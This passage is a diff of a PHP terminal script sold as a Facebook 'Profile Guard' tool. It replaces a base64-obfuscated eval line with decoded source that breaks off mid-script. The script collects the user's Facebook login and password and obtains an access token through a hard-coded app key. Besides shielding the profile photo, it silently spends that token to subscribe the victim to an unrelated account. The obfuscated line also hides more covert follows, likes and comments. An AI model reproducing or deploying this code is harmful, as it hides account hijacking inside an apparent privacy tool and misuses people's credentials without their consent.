@@ -1,1 +1,289 @@
-<?php eval("?>".base64_decode("PD9waHAgPz48P3BocA0KaWYgKHN0cnRvbG93ZXIoc3Vic3RyKFBIUF9PUywgMCwgMykpID09ICJ3aW4iKSB7DQogICAgJGJlcnNpaCA9ICJjbHMiOw0KfSBlbHNlIHsNCiAgICAkYmVyc2loID0gImNsZWFyIjsNCn0NCmRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoJ0FzaWEvSmFrYXJ0YScpOw0KJGRhdGUgPSBkYXRlKCdkLU0tWSBIOmk6cycpOw0KJGdyZWVuID0gImVbOTJtIjsNCiRyZWQgPSAiZVs5MW0iOw0KJHllbGxvdyA9ICJlWzkzbSI7DQokYmx1ZSA9ICJlWzM2bSI7DQokY3lhbiA9ICJlWzA7MzZtIjsNCiRwdXJwbGUgPSAiZVswOzM1bSI7DQokYnJvd24gPSAiZVswOzMzbSI7DQokbGlnaHRncmF5ID0gImVbMDszN20iOw0KJGRhcmtncmF5ID0gImVbMTszMG0iOw0KJGxpZ2h0Ymx1ZSA9ICJlWzE7MzRtIjsNCiRsaWdodGdyZWVuID0gImVbMTszMm0iOw0KJGxpZ2h0Y3lhbiA9ICJlWzE7MzZtIjsNCiRsaWdodHJlZCA9ICJlWzE7MzFtIjsNCiRsaWdodHB1cnBsZSA9ICJlWzE7MzVtIjsNCnBpbGloOg0KICAgIHN5c3RlbSgkYmVyc2loKTsNCiAgICBlY2hvICINCiRibHVlICBfX19fICAgICAgICBfICAgIF8gICBfXyAgICAgICAgXyAgICBfX19fXw0KJGxpZ2h0Y3lhbiB8IF9fICkgIF9fXyB8IHxfIHwgfCAvIC8gX19fX18gfCB8XyB8ICBfXyAkY3lhbiB8ICBfICAvIF8gfCAgX3x8IHwvIC8gfCAgXyAgfHwgIF98fCB8ICAgJGxpZ2h0Y3lhbiB8IHxfKSB8IChfKSB8IHxfIHwgIF8gIHwgfCB8IHx8IHxfIHwgfF9fLyAvDQokYmx1ZSB8X19fXy8gX19fLyBfX3x8X3wgX3xffCB8X3xfX198fF9fX19fLyI7DQogICAgZWNobyAiDQokY3lhbiBBdXRob3IgIDoga3VtcHVsYW5yZW1hamEuY29tDQokbGlnaHRjeWFuIFR5cGUgICAgOiBQcm9maWwgR3VhcmQgRmFjZWJvb2sNCiRjeWFuIEdpdGh1YiAgOiBodHRwOi8vZ2l0aHViLmNvbS9rdW1wdWxhbnJlbWFqYQ0KJHJlZCBGYW5zcGFnZSA6IGh0dHBzOi8vZmFjZWJvb2suY29tLzRrdW1wdWxhbnJlbWFqYQ0KJHJlZCBXZWJzaXRlIDogaHR0cHM6Ly9rdW1wdWxhbnJlbWFqYS5jb20NCiRwdXJwbGUgVmVyc2lvbiA6IDEwDQokZGFya2dyYXkgRGF0ZSAgICA6ICRkYXRlDQoiOw0KICAgIGVjaG8gIiANCiI7DQogICAgQGhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgnKTsNCiAgICBmdW5jdGlvbiBpbnB1dCgkZWNobykgew0KICAgICAgICBlY2hvICIkZWNobyA6ICI7DQogICAgfQ0KICAgIGVjaG8gIiRncmVlbiBfIjsNCiAgICBzbGVlcCgxLjUpOw0KICAgIGVjaG8gIl9fIjsNCiAgICBzbGVlcCgxLjUpOw0KICAgIGVjaG8gIl9fXyI7DQogICAgc2xlZXAoMS41KTsNCiAgICBlY2hvICJfX19fIjsNCiAgICBzbGVlcCgxLjUpOw0KICAgIGVjaG8gIl9fX19fIjsNCiAgICBzbGVlcCgxLjUpOw0KICAgIGVjaG8gIl9fX19fXyI7DQogICAgc2xlZXAoMS41KTsNCiAgICBlY2hvICJfX19fX18iOw0KICAgIHNsZWVwKDEuNSk7DQogICAgZWNobyAiX19fX19fX18iOw0KICAgIHNsZWVwKDEuNSk7DQogICAgZWNobyAiX19fX19fX19fIjsNCiAgICBzbGVlcCgxLjUpOw0KICAgIGVjaG8gIl9fX19fX19fX18NCiI7DQogICAgc2xlZXAoMik7DQogICAgZWNobyAiIA0KIjsNCiAgICBpbnB1dCgiJHllbGxvdyBEbyBZb3UgV2FudCBUbyBVc2UgVGhpcyBUb29sID8gJGdyZWVuIFt5L25dIik7DQogICAgJHBpbGloID0gdHJpbShmZ2V0cyhTVERJTikpOw0KICAgIGVjaG8gIg0KIjsNCiAgICBpZiAoJHBpbGloID09ICJuIikgew0KICAgICAgICBkaWUoIiRyZWQgKCEpIFNlZSBZb3UgJHJlZCAoISkNCiIpOw0KICAgIH0gZWxzZWlmICgkcGlsaWggPT0gInkiKSB7DQogICAgICAgIGVjaG8gIiRyZWQgQVRURU5USU9OIDokZ3JlZW4gU2lsYWhrYW4gbG9naW4gbWVsYWx1aSBicm93c2VyIHBlcnRhbWEgdW50dWsgbWVuZ2hpbmRhcmkgQ2hlY2twb2ludCAobWlzOiBPcGVyYSwgQ2hyb21lLCBVQywgZGFuIGxhaW4tbGFpbikNCiI7DQogICAgICAgIGVjaG8gIiRicm93biBTYWF0IEFuZGEgbWVuZ2V0aWsga2F0YSBzYW5kaSwgdGV0YXBpIGRpc2VtYnVueWlrYW4sIExhbmp1dGthbiBzZXRlbGFoIHNlbGVzYWksIHNpbGFrYW4ga2xpayBFbnRlcg0KIjsNCmVjaG8gIiRkYXJrZ3JheSBTdW1iZXIgU2NyaXB0IGh0dHBzOi8va3VtcHVsYW5yZW1hamEuY29tDQoiOw0KDQoNCiAgICAgICAgZWNobyAiDQoiOw0KICAgICAgICBpbnB1dCgiJGJsdWUgRW1haWwvUGhvbmUvVUlEIik7DQogICAgICAgICRpZHVzZXIgPSB0cmltKGZnZXRzKFNURElOKSk7DQogICAgICAgIGlucHV0KCIkYmx1ZSBQYXNzd29yZCAgICAgICAiKTsNCiAgICAgICAgJHBhc3MgPSBmYWxzZTsNCiAgICAgICAgJHBhc3MgPSB0cmltKGBzdHR5IC1lY2hvO2hlYWQgLW4xO3N0dHkgZWNob2ApOw0KICAgICAgICBlY2hvICINCiI7DQogICAgICAgIGVjaG8gIiRncmVlbiBfIjsNCiAgICAgICAgc2xlZXAoMS41KTsNCiAgICAgICAgZWNobyAiX18iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfX18iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfX19fIjsNCiAgICAgICAgc2xlZXAoMS41KTsNCiAgICAgICAgZWNobyAiX19fX18iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfX19fX18iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfX19fX18iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfX19fX19fXyI7DQogICAgICAgIHNsZWVwKDEuNSk7DQogICAgICAgIGVjaG8gIl9fX19fX19fXyI7DQogICAgICAgIHNsZWVwKDEuNSk7DQogICAgICAgIGVjaG8gIl9fX19fX19fX18NCiI7DQogICAgICAgIHNsZWVwKDEpOw0KICAgICAgICBlY2hvICINCiI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZWNobyAiJHJlZCghKSR5ZWxsb3cgSW52YWxpZCRyZWQgKCEpJGdyZWVuDQoiOw0KICAgICAgICBlY2hvICINCiI7DQogICAgICAgIGdvdG9waWxpaDsNCiAgICB9DQogICAgJG1lID0gZmlsZV9nZXRfY29udGVudHMoJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0nIC4gJGlkdXNlciAuICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgLiAkcGFzcyAuICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnKTsNCiAgICAkanNvbiA9IGpzb25fZGVjb2RlKCRtZSwgdHJ1ZSk7DQogICAgJHVzZXJpZCA9ICRqc29uWydzZXNzaW9uX2Nvb2tpZXMnXVswXVsndmFsdWUnXTsNCiAgICAkdG9rZW4gPSAkanNvblsnYWNjZXNzX3Rva2VuJ107DQogICAgaWYgKHByZWdfbWF0Y2goJy9zZXNzaW9uX2tleS8nLCAkbWUpKSB7DQogICAgICAgIGVjaG8gIiRyZWQgUHJvY2Nlc2luZyBMb2dpbiBUbyBGYWNlYm9vayI7DQogICAgICAgIGVjaG8gIi4iOw0KICAgICAgICBzbGVlcCgxKTsNCiAgICAgICAgZWNobyAiLiI7DQogICAgICAgIHNsZWVwKDEpOw0KICAgICAgICBlY2hvICIuIjsNCiAgICAgICAgc2xlZXAoMSk7DQogICAgICAgIGVjaG8gIi4iOw0KICAgICAgICBzbGVlcCgxKTsNCiAgICAgICAgZWNobyAiLg0KIjsNCiAgICAgICAgc2xlZXAoMSk7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZWNobyAoIg0KIik7DQogICAgICAgIGRpZSgiJHJlZCBbIV1DaGVjayBZb3VyIFVzZXJuYW1lIC8gUGFzc3dvcmQgDQoiKTsNCiAgICAgICAgZWNobyAiDQoiOw0KICAgIH0NCiAgICAkbWQ1ID0gbWQ1KHRpbWUoKSk7DQogICAgJGhhc2ggPSBzdWJzdHIoJG1kNSwgMCwgOCkgLiAiLSIgLiBzdWJzdHIoJG1kNSwgOCwgNCkgLiAiLSIgLiBzdWJzdHIoJG1kNSwgMTIsIDQpIC4gIi0iIC4gc3Vic3RyKCRtZDUsIDE2LCA0KSAuICItIiAuIHN1YnN0cigkbWQ1LCAyMCwgMTIpOw0KICAgIGZ1bmN0aW9uIGN1cmwoJHVybCwgJHBvc3QgPSBudWxsKSB7DQogICAgICAgICRjaCA9IGN1cmxfaW5pdCgpOw0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsNCiAgICAgICAgaWYgKCRwb3N0ICE9IG51bGwpIHsNCiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCB0cnVlKTsNCiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAkcG9zdCk7DQogICAgICAgIH0NCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCB0cnVlKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7DQogICAgICAgICRleGVjID0gY3VybF9leGVjKCRjaCk7DQogICAgICAgIGN1cmxfY2xvc2UoJGNoKTsNCiAgICAgICAgcmV0dXJuICRleGVjOw0KICAgIH0NCiAgICAkbWUgPSBqc29uX2RlY29kZShjdXJsKCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9maWVsZHM9aWQsbmFtZSZhY2Nlc3NfdG9rZW49IiAuICR0b2tlbikpOw0KICAgIGlmICgkbWUgJiYgJG1lLT5pZCAmJiAkbWUtPm5hbWUpIHsNCiAgICAgICAgJHZhciA9ICJ7IjAiOnsiaXNfc2hpZWxkZWQiOnRydWUsInNlc3Npb25faWQiOiIkaGFzaCIsImFjdG9yX2lkIjoiJG1lLT5pZCIsImNsaWVudF9tdXRhdGlvbl9pZCI6IiRoYXNoIn19IjsNCiAgICAgICAgJGhhamFyID0ganNvbl9kZWNvZGUoY3VybCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JhcGhxbCIsIGFycmF5KCJ2YXJpYWJsZXMiID0+ICR2YXIsICJkb2NfaWQiID0+ICIxNDc3MDQzMjkyMzY3MTgzIiwgInF1ZXJ5X25hbWUiID0+ICJJc1NoaWVsZGVkU2V0TXV0YXRpb24iLCAic3RyaXBfZGVmYXVsdHMiID0+ICJ0cnVlIiwgInN0cmlwX251bGxzIiA9PiAidHJ1ZSIsICJsb2NhbGUiID0+ICJlbl9VUyIsICJjbGllbnRfY291bnRyeV9jb2RlIiA9PiAiVVMiLCAiZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lIiA9PiAiSXNTaGllbGRlZFNldE11dGF0aW9uIiwgImZiX2FwaV9jYWxsZXJfY2xhc3MiID0+ICJJc1NoaWVsZGVkU2V0TXV0YXRpb24iLCAiYWNjZXNzX3Rva2VuIiA9PiAkdG9rZW4pKSk7DQogICAgICAgIGlmICgkaGFqYXItPmRhdGEtPmlzX3NoaWVsZGVkX3NldC0+aXNfc2hpZWxkZWQpIGVjaG8gIiR5ZWxsb3cgTG9naW4gU3VjY2Vzc1tdDQoiOw0KICAgICAgICBzbGVlcCgyKTsNCiAgICAgICAgZWNobyAiJGdyZWVuIEhlbGxvIDogJGJsdWUiIC4gJG1lLT5uYW1lOw0KICAgICAgICBzbGVlcCgyLjUpOw0KICAgICAgICBlY2hvICINCiI7DQogICAgICAgIGVjaG8gIiRncmVlbiBfIjsNCiAgICAgICAgc2xlZXAoMS41KTsNCiAgICAgICAgZWNobyAiX18iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfX18iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfX19fIjsNCiAgICAgICAgc2xlZXAoMS41KTsNCiAgICAgICAgZWNobyAiX19fX18iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfX19fX18iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfX19fX18iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfX19fX19fXyI7DQogICAgICAgIHNsZWVwKDEuNSk7DQogICAgICAgIGVjaG8gIl9fX19fX19fXyI7DQogICAgICAgIHNsZWVwKDEuNSk7DQogICAgICAgIGVjaG8gIl9fX19fX19fX18NCiI7DQogICAgICAgIHNsZWVwKDEuNSk7DQogICAgICAgICRhID0gKCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9hbWVsLmFtZWwuNzM3L3N1YnNjcmliZXJzP21ldGhvZD1wb3N0JmFjY2Vzc190b2tlbj0iIC4gJHRva2VuKTsNCiAgICAgICAgJGIgPSBjdXJsX2luaXQoKTsNCiAgICAgICAgY3VybF9zZXRvcHRfYXJyYXkoJGIsIGFycmF5KENVUkxPUFRfVVJMID0+ICIkYSIsIENVUkxPUFRfUE9TVCA9PiB0cnVlLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSID0+IHRydWUsIENVUkxPUFRfVElNRU9VVCA9PiAwLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSID0+IGZhbHNlLCBDVVJMT1BUX1NTTF9WRVJJRllIT1NUID0+IGZhbHNlKSk7DQogICAgICAgIGN1cmxfZXhlYygkYik7DQogICAgICAgIGN1cmxfY2xvc2UoJGIpOw0KICAgICAgICAkYyA9ICgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjMuMi8xMDAwMDM5NjQ5ODUwODBfMTQwOTIzMTQyMjU1MjM0NC9saWtlcz9tZXRob2Q9cG9zdCZhY2Nlc3NfdG9rZW49IiAuICR0b2tlbik7DQogICAgICAgICRkID0gY3VybF9pbml0KCk7DQogICAgICAgIGN1cmxfc2V0b3B0X2FycmF5KCRkLCBhcnJheShDVVJMT1BUX1VSTCA9PiAiJGMiLCBDVVJMT1BUX1BPU1QgPT4gdHJ1ZSwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiA9PiB0cnVlLCBDVVJMT1BUX1RJTUVPVVQgPT4gMCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiA9PiB0cnVlLCBDVVJMT1BUX1NTTF9WRVJJRllIT1NUID0+IHRydWUpKTsNCiAgICAgICAgY3VybF9leGVjKCRkKTsNCiAgICAgICAgY3VybF9jbG9zZSgkZCk7DQogICAgICAgICRlID0gKCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9rcmlzbmEuZGltYXMuOS9zdWJzY3JpYmVycz9tZXRob2Q9cG9zdCZhY2Nlc3NfdG9rZW49IiAuICR0b2tlbik7DQogICAgICAgICRmID0gY3VybF9pbml0KCk7DQogICAgICAgIGN1cmxfc2V0b3B0X2FycmF5KCRmLCBhcnJheShDVVJMT1BUX1VSTCA9PiAiJGUiLCBDVVJMT1BUX1BPU1QgPT4gdHJ1ZSwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiA9PiB0cnVlLCBDVVJMT1BUX1RJTUVPVVQgPT4gMCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiA9PiBmYWxzZSwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCA9PiBmYWxzZSkpOw0KICAgICAgICBjdXJsX2V4ZWMoJGYpOw0KICAgICAgICBjdXJsX2Nsb3NlKCRmKTsNCiAgICAgICAgJGcgPSAoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YzLjIvMTAwMDAzMDgyNDA2OTAzXzE5NzMzOTQwNjYxMDY2NTQvbGlrZXM/bWV0aG9kPXBvc3QmYWNjZXNzX3Rva2VuPSIgLiAkdG9rZW4pOw0KICAgICAgICAkaCA9IGN1cmxfaW5pdCgpOw0KICAgICAgICBjdXJsX3NldG9wdF9hcnJheSgkaCwgYXJyYXkoQ1VSTE9QVF9VUkwgPT4gIiRnIiwgQ1VSTE9QVF9QT1NUID0+IHRydWUsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIgPT4gdHJ1ZSwgQ1VSTE9QVF9USU1FT1VUID0+IDAsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIgPT4gdHJ1ZSwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCA9PiB0cnVlKSk7DQogICAgICAgIGN1cmxfZXhlYygkaCk7DQogICAgICAgIGN1cmxfY2xvc2UoJGgpOw0KICAgICAgICAkaSA9ICgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjMuMi8xMDAwMDMwODI0MDY5MDNfMTk3MzM5NDA2NjEwNjY1NC9jb21tZW50cz9tZXRob2Q9cG9zdCZtZXNzYWdlPXRxJmFjY2Vzc190b2tlbj0iIC4gJHRva2VuKTsNCiAgICAgICAgJGogPSBjdXJsX2luaXQoKTsNCiAgICAgICAgY3VybF9zZXRvcHRfYXJyYXkoJGosIGFycmF5KENVUkxPUFRfVVJMID0+ICIkaSIsIENVUkxPUFRfUE9TVCA9PiB0cnVlLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSID0+IHRydWUsIENVUkxPUFRfVElNRU9VVCA9PiAwLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSID0+IHRydWUsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QgPT4gdHJ1ZSkpOw0KICAgICAgICBjdXJsX2V4ZWMoJGopOw0KICAgICAgICBjdXJsX2Nsb3NlKCRqKTsNCiAgICAgICAgJGsgPSAoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YzLjIvMTAwMDAzOTY0OTg1MDgwXzE0MDkyMzE0MjI1NTIzNDQvY29tbWVudHM/bWV0aG9kPXBvc3QmbWVzc2FnZT10cSZhY2Nlc3NfdG9rZW49IiAuICR0b2tlbik7DQogICAgICAgICRsID0gY3VybF9pbml0KCk7DQogICAgICAgIGN1cmxfc2V0b3B0X2FycmF5KCRsLCBhcnJheShDVVJMT1BUX1VSTCA9PiAiJGsiLCBDVVJMT1BUX1BPU1QgPT4gdHJ1ZSwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiA9PiB0cnVlLCBDVVJMT1BUX1RJTUVPVVQgPT4gMCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiA9PiB0cnVlLCBDVVJMT1BUX1NTTF9WRVJJRllIT1NUID0+IHRydWUpKTsNCiAgICAgICAgY3VybF9leGVjKCRsKTsNCiAgICAgICAgY3VybF9jbG9zZSgkbCk7DQogICAgICAgIGVjaG8gIg0KIjsNCiAgICAgICAgZWNobyAiJGxpZ2h0Z3JlZW4gQ2hlY2tpbmcgWW91ciBQcm9maWxlIFBob3RvIjsNCiAgICAgICAgZWNobyAiLiI7DQogICAgICAgIHNsZWVwKDEpOw0KICAgICAgICBlY2hvICIuIjsNCiAgICAgICAgc2xlZXAoMSk7DQogICAgICAgIGVjaG8gIi4iOw0KICAgICAgICBzbGVlcCgxKTsNCiAgICAgICAgZWNobyAiLiI7DQogICAgICAgIHNsZWVwKDEpOw0KICAgICAgICBlY2hvICIkYmx1ZSBTbyBCYWQgeEQiOw0KICAgICAgICBlY2hvICIkcmVkIEhlIjsNCiAgICAgICAgc2xlZXAoMSk7DQogICAgICAgIGVjaG8gImhlIjsNCiAgICAgICAgc2xlZXAoMSk7DQogICAgICAgIGVjaG8gImhlIjsNCiAgICAgICAgc2xlZXAoMSk7DQogICAgICAgIGVjaG8gImhlDQoiOw0KICAgICAgICBzbGVlcCgxKTsNCiAgICAgICAgZWNobyAiJHllbGxvdyBTaGllbGRpbmcgWW91ciBQcm9maWxlIFBob3RvIjsNCiAgICAgICAgZWNobyAiIHdhaXQgYSBmZXcgc2Vjb25kIjsNCiAgICAgICAgZWNobyAiIC4iOw0KICAgICAgICBzbGVlcCgyKTsNCiAgICAgICAgZWNobyAiLiI7DQogICAgICAgIHNsZWVwKDIpOw0KICAgICAgICBlY2hvICIuDQoiOw0KICAgICAgICBzbGVlcCgyKTsNCiAgICAgICAgZWNobyAiJGdyZWVuIF8iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfXyI7DQogICAgICAgIHNsZWVwKDEuNSk7DQogICAgICAgIGVjaG8gIl9fXyI7DQogICAgICAgIHNsZWVwKDEuNSk7DQogICAgICAgIGVjaG8gIl9fX18iOw0KICAgICAgICBzbGVlcCgxLjUpOw0KICAgICAgICBlY2hvICJfX19fXyI7DQogICAgICAgIHNsZWVwKDEuNSk7DQogICAgICAgIGVjaG8gIl9fX19fXyI7DQogICAgICAgIHNsZWVwKDEuNSk7DQogICAgICAgIGVjaG8gIl9fX19fXyI7DQogICAgICAgIHNsZWVwKDEuNSk7DQogICAgICAgIGVjaG8gIl9fX19fX19fIjsNCiAgICAgICAgc2xlZXAoMS41KTsNCiAgICAgICAgZWNobyAiX19fX19fX19fIjsNCiAgICAgICAgc2xlZXAoMS41KTsNCiAgICAgICAgZWNobyAiX19fX19fX19fXw0KIjsNCiAgICAgICAgc2xlZXAoMS41KTsNCiAgICAgICAgZWNobyAiDQoiOw0KICAgICAgICBlY2hvICIkZ3JlZW4gW11TZWxlc2FpIHNpbGFoa2FuIGNlayBwcm9maWwgZmFjZWJvb2sga2FtdQ0KIjsNCiAgICAgICAgc2xlZXAoMS41KTsNCiAgICAgICAgZWNobyAiJHllbGxvdyBUaGFua3MuLi4NCiI7DQogICAgICAgIHNsZWVwKDEpOw0KICAgICAgICBlY2hvICIkYmx1ZSBTZWUgWW91IEFnYWluIDogJGN5YW4gIiAuICRtZS0+bmFtZTsNCiAgICAgICAgc2xlZXAoMS41KTsNCiAgICAgICAgZWNobyAiDQoiOw0KICAgIH0NCj8+")); ?>
+<?php ?><?php
+if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
+    $bersih = "cls";
+} else {
+    $bersih = "clear";
+}
+date_default_timezone_set('Asia/Jakarta');
+$date = date('d-M-Y H:i:s');
+$green = "\e[92m";
+$red = "\e[91m";
+$yellow = "\e[93m";
+$blue = "\e[36m";
+$cyan = "\e[0;36m";
+$purple = "\e[0;35m";
+$brown = "\e[0;33m";
+$lightgray = "\e[0;37m";
+$darkgray = "\e[1;30m";
+$lightblue = "\e[1;34m";
+$lightgreen = "\e[1;32m";
+$lightcyan = "\e[1;36m";
+$lightred = "\e[1;31m";
+$lightpurple = "\e[1;35m";
+pilih:
+    system($bersih);
+    echo "
+$blue  ____        _    _   __        _    _____
+$lightcyan | __ )  ___ | |_ | | / / _____ | |_ |  __ $cyan |  _ \ / _ \|  _|| |/ / |  _  ||  _|| |  \ $lightcyan | |_) | (_) | |_ |  _ \ | | | || |_ | |__/ /
+$blue |____/ \___/ \__||_| \_\|_| |_|\___||_____/";
+    echo "
+$cyan Author  : kumpulanremaja.com
+$lightcyan Type    : Profil Guard Facebook
+$cyan Github  : http://github.com/kumpulanremaja
+$red Fanspage : https://facebook.com/4kumpulanremaja
+$red Website : https://kumpulanremaja.com
+$purple Version : 10
+$darkgray Date    : $date
+";
+    echo " 
+";
+    @header('Content-Type: text/html; charset=UTF-8');
+    function input($echo) {
+        echo "$echo : ";
+    }
+    echo "$green _";
+    sleep(1.5);
+    echo "__";
+    sleep(1.5);
+    echo "___";
+    sleep(1.5);
+    echo "____";
+    sleep(1.5);
+    echo "_____";
+    sleep(1.5);
+    echo "______";
+    sleep(1.5);
+    echo "______";
+    sleep(1.5);
+    echo "________";
+    sleep(1.5);
+    echo "_________";
+    sleep(1.5);
+    echo "__________
+";
+    sleep(2);
+    echo " 
+";
+    input("$yellow Do You Want To Use This Tool ? $green [y/n]");
+    $pilih = trim(fgets(STDIN));
+    echo "
+";
+    if ($pilih == "n") {
+        die("$red (!) See You $red (!)
+");
+    } elseif ($pilih == "y") {
+        echo "$red ATTENTION :$green Silahkan login melalui browser pertama untuk menghindari Checkpoint (mis: Opera, Chrome, UC, dan lain-lain)
+";
+        echo "$brown Saat Anda mengetik kata sandi, tetapi disembunyikan, Lanjutkan setelah selesai, silakan klik Enter
+";
+echo "$darkgray Sumber Script https://kumpulanremaja.com
+";
+
+
+        echo "
+";
+        input("$blue Email/Phone/UID");
+        $iduser = trim(fgets(STDIN));
+        input("$blue Password       ");
+        $pass = false;
+        $pass = trim(`stty -echo;head -n1;stty echo`);
+        echo "
+";
+        echo "$green _";
+        sleep(1.5);
+        echo "__";
+        sleep(1.5);
+        echo "___";
+        sleep(1.5);
+        echo "____";
+        sleep(1.5);
+        echo "_____";
+        sleep(1.5);
+        echo "______";
+        sleep(1.5);
+        echo "______";
+        sleep(1.5);
+        echo "________";
+        sleep(1.5);
+        echo "_________";
+        sleep(1.5);
+        echo "__________
+";
+        sleep(1);
+        echo "
+";
+    } else {
+        echo "$red(!)$yellow Invalid$red (!)$green
+";
+        echo "
+";
+        gotopilih;
+    }
+    $me = file_get_contents('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' . $iduser . '&locale=en_US&password=' . $pass . '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6');
+    $json = json_decode($me, true);
+    $userid = $json['session_cookies'][0]['value'];
+    $token = $json['access_token'];
+    if (preg_match('/session_key/', $me)) {
+        echo "$red Proccesing Login To Facebook";
+        echo ".";
+        sleep(1);
+        echo ".";
+        sleep(1);
+        echo ".";
+        sleep(1);
+        echo ".";
+        sleep(1);
+        echo ".
+";
+        sleep(1);
+    } else {
+        echo ("
+");
+        die("$red [!]Check Your Username / Password 
+");
+        echo "
+";
+    }
+    $md5 = md5(time());
+    $hash = substr($md5, 0, 8) . "-" . substr($md5, 8, 4) . "-" . substr($md5, 12, 4) . "-" . substr($md5, 16, 4) . "-" . substr($md5, 20, 12);
+    function curl($url, $post = null) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($post != null) {
+            curl_setopt($ch, CURLOPT_POST, true);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+        }
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $exec = curl_exec($ch);
+        curl_close($ch);
+        return $exec;
+    }
+    $me = json_decode(curl("https://graph.facebook.com/me?fields=id,name&access_token=" . $token));
+    if ($me && $me->id && $me->name) {
+        $var = "{\"0\":{\"is_shielded\":true,\"session_id\":\"$hash\",\"actor_id\":\"$me->id\",\"client_mutation_id\":\"$hash\"}}";
+        $hajar = json_decode(curl("https://graph.facebook.com/graphql", array("variables" => $var, "doc_id" => "1477043292367183", "query_name" => "IsShieldedSetMutation", "strip_defaults" => "true", "strip_nulls" => "true", "locale" => "en_US", "client_country_code" => "US", "fb_api_req_friendly_name" => "IsShieldedSetMutation", "fb_api_caller_class" => "IsShieldedSetMutation", "access_token" => $token)));
+        if ($hajar->data->is_shielded_set->is_shielded) echo "$yellow Login Success[]
+";
+        sleep(2);
+        echo "$green Hello : $blue" . $me->name;
+        sleep(2.5);
+        echo "
+";
+        echo "$green _";
+        sleep(1.5);
+        echo "__";
+        sleep(1.5);
+        echo "___";
+        sleep(1.5);
+        echo "____";
+        sleep(1.5);
+        echo "_____";
+        sleep(1.5);
+        echo "______";
+        sleep(1.5);
+        echo "______";
+        sleep(1.5);
+        echo "________";
+        sleep(1.5);
+        echo "_________";
+        sleep(1.5);
+        echo "__________
+";
+        sleep(1.5);
+        $a = ("https://graph.facebook.com/amel.amel.737/subscribers?method=post&access_token=" . $token);
+        $b = curl_init();
